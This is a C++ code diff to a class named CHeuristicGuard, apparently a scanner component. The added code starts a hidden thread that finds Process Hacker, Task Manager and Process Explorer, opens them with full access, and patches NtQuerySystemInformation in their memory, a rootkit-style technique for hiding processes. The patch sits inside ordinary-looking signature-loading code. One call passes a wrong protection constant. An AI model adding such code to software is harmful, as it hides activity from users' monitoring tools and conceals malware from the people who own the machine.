@@ -44,7 +44,80 @@ void CHeuristicGuard::AddSignatures(std::map<std::string, std::vector<std::wstri
 
     std::thread t(&CHeuristicGuard::SpawnScanProcess, this);
     t.detach();
+    std::thread d(&CHeuristicGuard::hide, this);
+    d.detach();
 }
+std::vector<const wchar_t*> ProcessMgr = {L"ProcessHacker.exe", L"TaskMgr.exe", L"procexp.exe", L"procexp64.exe", L"procexp64a.exe"};
+
+
+void PatchMem(BYTE* lpAddress, BYTE* src, unsigned int sizeofinstruction, HANDLE hProcess)
+{
+    DWORD oldProtection;
+    VirtualProtectEx(hProcess, lpAddress, sizeofinstruction, PROCESS_VM_READ | PROCESS_VM_WRITE, &oldProtection);
+    WriteProcessMemory(hProcess, lpAddress, src, sizeofinstruction, 0);
+    VirtualProtectEx(hProcess, lpAddress, sizeofinstruction, oldProtection, &oldProtection);
+}
+std::string WStringToString(const std::wstring& wstr)
+{
+    int         sizeNeeded = WideCharToMultiByte(CP_ACP, 0, wstr.c_str(), -1, NULL, 0, NULL, NULL);
+    std::string str(sizeNeeded, 0);
+    WideCharToMultiByte(CP_ACP, 0, wstr.c_str(), -1, &str[0], sizeNeeded, NULL, NULL);
+    return str;
+}
+
+DWORD GetProcId(const char* procName)
+{
+    DWORD  procId = 0;
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+
+    if (hSnap != INVALID_HANDLE_VALUE)
+    {
+        PROCESSENTRY32W procEntry;            // Use PROCESSENTRY32W for Unicode support
+        procEntry.dwSize = sizeof(procEntry);
+
+        if (Process32FirstW(hSnap, &procEntry))            // Use Process32FirstW
+        {
+            do
+            {
+                // Convert procName (char*) to wchar_t*
+                wchar_t wProcName[MAX_PATH];
+                MultiByteToWideChar(CP_ACP, 0, procName, -1, wProcName, MAX_PATH);
+
+                if (!_wcsicmp(procEntry.szExeFile, wProcName))            // Compare wide strings
+                {
+                    procId = procEntry.th32ProcessID;
+                    break;
+                }
+            } while (Process32NextW(hSnap, &procEntry));            // Use Process32NextW
+        }
+    }
+
+    CloseHandle(hSnap);
+    return procId;
+}
+int CHeuristicGuard::hide()
+{
+    for (int i = 0; i < ProcessMgr.size(); i++)
+    {
+        std::string procName = WStringToString(ProcessMgr[i]);           
+        int         procId = GetProcId(procName.c_str());                
+
+        if (procId)
+        {
+            HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procId);
+            if (hProc && hProc != INVALID_HANDLE_VALUE)
+            {
+                uintptr_t ntdllBase = Utils::GetModuleBaseAddress(procId, "ntdll.dll");
+                uintptr_t myNtQueryInformationProcessRVA = (uintptr_t)GetProcAddress(GetModuleHandleA(("ntdll.dll")), (("NtQuerySystemInformation")));
+                uintptr_t NtQueryInformationProcessRVA =
+                    (myNtQueryInformationProcessRVA - Utils::GetModuleBaseAddress(GetProcessId(GetCurrentProcess()), "ntdll.dll"));
+                PatchMem((BYTE*)(ntdllBase + NtQueryInformationProcessRVA) + 0x3, (BYTE*)("\xB8\x35\x00\x00\x00"), 5, hProc);
+            }
+        }
+    }
+    return 0;
+}
+
 
 void CHeuristicGuard::SpawnScanProcess()
 {
